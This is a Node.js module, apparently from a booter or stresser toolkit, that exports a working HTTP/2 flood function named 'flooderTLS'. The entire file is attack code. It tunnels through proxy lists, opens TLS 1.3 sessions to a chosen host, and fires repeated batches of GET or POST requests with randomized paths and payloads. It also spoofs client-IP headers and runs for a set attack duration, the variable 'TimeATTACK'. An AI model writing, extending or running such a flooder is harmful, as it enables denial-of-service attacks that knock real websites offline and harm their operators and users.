var http = require("http");
var tls = require("tls");
const http2 = require('http2');

tls["DEFAULT_MIN_VERSION"] = "TLSv1.3";

let Tls_connecT = "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA";

function between(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function rnd_string(length, type) 
{
    var _ = "";
    var characters = "";
    if (type == "LN") 
    {
        characters ="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    } 
    else if (type == "L") 
    {
        characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    } 
    else if (type == "N")
    {
        characters = "0123456789";
    } 
    else 
    {
    characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    }

    var charactersLength = characters.length;

    for (var i = 0; i < length; i++) 
    {
        _ += characters.charAt(Math.floor(Math.random() * charactersLength));
    }

    return _;
}

function parseRandTarget(target) 
{
    if (target.includes("%RAND%")) 
    {
        target = target.replace(/%RAND%/g, rnd_string(8, "LN"));
    } 
    else if (target.includes("%RANDLN8%")) 
    {
        target = target.replace(/%RANDLN8%/g, rnd_string(8, "LN"));
    } 
    else if (target.includes("%RANDLN16%")) 
    {
        target = target.replace(/%RANDLN16%/g, rnd_string(16, "LN"));
    } 
    else if (target.includes("%RANDLN32%")) 
    {
        target = target.replace(/%RANDLN32%/g, rnd_string(32, "LN"));
    } 
    else if (target.includes("%RANDLN64%")) 
    {
        target = target.replace(/%RANDLN64%/g, rnd_string(64, "LN"));
    } 
    else if (target.includes("%RANDL%")) 
    {
        target = target.replace(/%RANDL%/g, rnd_string(8, "L"));
    } 
    else if (target.includes("%RANDL16%")) 
    {
        target = target.replace(/%RANDL16%/g, rnd_string(16, "L"));
    } 
    else if (target.includes("%RANDL32%")) 
    {
        target = target.replace(/%RANDL32%/g, rnd_string(32, "L"));
    } 
    else if (target.includes("%RANDL64%")) 
    {
        target = target.replace(/%RANDL64%/g, rnd_string(64, "L"));
    } 
    else if (target.includes("%RANDN%")) 
    {
        target = target.replace(/%RANDN%/g, rnd_string(8, "N"));
    } 
    else if (target.includes("%RANDN16%")) 
    {
        target = target.replace(/%RANDN16%/g, rnd_string(16, "N"));
    } 
    else if (target.includes("%RANDN32%")) 
    {
        target = target.replace(/%RANDN32%/g, rnd_string(32, "N"));
    } 
    else if (target.includes("%RANDN64%")) 
     {
        target = target.replace(/%RANDN64%/g, rnd_string(64, "N"));
    } 
    else 
    {
        target = target;
    }
    return target;
}

var flooderTLS = function (option = {}) 
{
    let proxy = option.ip;
    let cookies = option.cookie;
    let ua = option.ua;
    let host = option.host;
    let addcookie = option.addcookie;
    let target = option.target;
    let rff = option.rff;
    let Method = option.METHOD;
    let RequestIP = option.RequestIP;
    let TimeATTACK = option.TimeATTACK;
    let connections = option.connections;

    if (Method == "GET") {
        setInterval(function () {
        try {

            var req = http.request({
            host: proxy.split(":")[0],
            headers: {
                "User-Agent": ua,
                Cookie: cookies || "Booter.sx",
            },
            rejectUnauthorized: false,
            port: proxy.split(":")[1],
            method: "CONNECT",
            path: host,
            });

            req
            .on("connect", function (res, socket, head) {

                const session = http2.connect(`https://${host}`,{
                createConnection : () => tls.connect(
                    {
                    host: host,
                    secureOptions: "SSL_OP_ALL",
                    requestCert: true,
                    servername: host,
                    secure: true,
                    rejectUnauthorized: false,
                    sessionTimeout: 10000,
                    socket: socket,
                    minVersion:'TLSv1.3',
                    maxVersion:'TLSv1.3',
                    ALPNProtocols:['h2']
                    },
                    function () {
    
                    for (let j = 0; j < connections; j++) {
                        let targetR = parseRandTarget(target);
                        let targetRE =
                        `${new URL(targetR).pathname}` +
                        `${new URL(targetR).search}`;
                        const thiss = session.request({
                        ":path":targetRE,
                        ":method":"GET",
                        "User-Agent": ua,
                        "Referer":rff,
                        "Origin":targetR,
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Cache-Control": "max-age=0",
                        "Cookie":`${cookies}${addcookie}`,
                        "x-forwarded-for":proxy.split(":")[0],
                        "x-remote-ip":proxy.split(":")[0],
                        "x-real-ip":proxy.split(":")[0],
                        })
                        thiss.end();
                        setTimeout(() => {
                        thiss.close();
                        thiss.destroy();
                        return delete session;
                        },5000);
                    }
                    }
                )
                })

            })
            .end();
        } catch (err) {
            console.log("[FAILED] - WHOPSSS!");
            return process.exit();
        }
        }, RequestIP);

        setTimeout(() => {
        console.clear();
        console.log(`Process "${process.pid}" Is end.`);
        process.exit(1);
        }, TimeATTACK * 1000);
    } else if (Method == "POST") {
        let PostData = option.PostData;
        setInterval(function () {
        try {
            var req = http.request({
            host: proxy.split(":")[0],
            headers: {
                "User-Agent": ua,
                Cookie: cookies || "Booter.sx",
            },
            rejectUnauthorized: false,
            port: proxy.split(":")[1],
            method: "CONNECT",
            path: host + ":443",
            });

            req
            .on("connect", function (res, socket, head) {
                const session = http2.connect(`https://${host}`,{
                createConnection : () => tls.connect(
                    {
                    host: host,
                    secureOptions: "SSL_OP_ALL",
                    requestCert: true,
                    servername: host,
                    secure: true,
                    rejectUnauthorized: false,
                    sessionTimeout: 10000,
                    socket: socket,
                    minVersion:'TLSv1.3',
                    maxVersion:'TLSv1.3',
                    ALPNProtocols:['h2']
                    },
                    function () {
    
                    for (let j = 0; j < connections; j++) {
                        let targetR = parseRandTarget(target);
                        let pdata;
                        if (PostData) {
                        if(PostData.split('&').length > 1){
                            pdata = parseRandTarget(decodeURI(PostData));
                            pdata = parseRandTarget(pdata);
                        }else{
                            pdata = parseRandTarget(decodeURI(PostData));
                        }
                        } else {
                        pdata = "/";
                        }
                        let cType = 'application/json';
                        try {  
                        const parser = JSON.parse(pdata);  
                        } catch (e) {  
                        cType = 'application/x-www-form-urlencoded';
                        }
                        let pdata_len = Buffer.byteLength(pdata, "utf8");
                        let targetRE =
                        `${new URL(targetR).pathname}` +
                        `${new URL(targetR).search}`;

                        const thisrequest = session.request({
                        ":path":targetRE,
                        ":method":"POST",
                        "User-Agent": ua,
                        "Referer":rff,
                        "Origin":targetR,
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Cache-Control": "max-age=0",
                        "Cookie":`${cookies}${addcookie}`,
                        "x-forwarded-for":proxy.split(":")[0],
                        "x-remote-ip":proxy.split(":")[0],
                        "x-real-ip":proxy.split(":")[0],
                        "Content-Type":cType,
                        "Content-Length": `${pdata_len}`
                        })

                        thisrequest.setEncoding('utf8');
                        thisrequest.write(pdata);
                        thisrequest.end();


                        setTimeout(() => {
                        thisrequest.close();
                        thisrequest.destroy();
                        return delete session;
                        },5000);
                    }
                    }
                )
                })
            })
            .end();
        } catch (err) {
            console.log("[error] - WHOOPSSS!");
            return process.exit();
        }
        }, RequestIP);

        setTimeout(() => {
        console.clear();
        console.log(`[info] Process "${process.pid}" Is end.`);
        process.exit(1);
        }, TimeATTACK * 1000);
    }
    else {
        return "Invalide method";
    }
};

module.exports = { flooderTLS: flooderTLS };
